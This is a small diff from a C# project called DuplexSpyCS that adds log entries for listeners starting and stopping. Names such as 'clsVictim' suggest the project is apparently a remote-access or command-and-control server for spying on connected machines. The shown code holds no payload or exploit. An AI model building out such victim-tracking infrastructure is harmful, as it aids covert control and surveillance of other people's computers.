@@ -78,6 +78,16 @@ namespace DuplexSpyCS
 
         }
 
+        public void fnOnListenerStarted(clsListener listener)
+        {
+            clsStore.sql_conn.WriteSystemLogs($"Listener is started(Name={listener.m_szName}, Port={listener.m_nPort}, Protocol={Enum.GetName(listener.m_protocol)})");
+        }
+
+        public void fnOnListenerStopped(clsListener listener)
+        {
+            clsStore.sql_conn.WriteSystemLogs($"Listener is stopped(Name={listener.m_szName})");
+        }
+
         public void fnReceived(clsListener listener, clsVictim victim, (int nCommand, int nParam, int nDataLength, byte[] abMsg) buffer, int nRecv)
         {
             Received?.Invoke(listener, victim, buffer, nRecv);
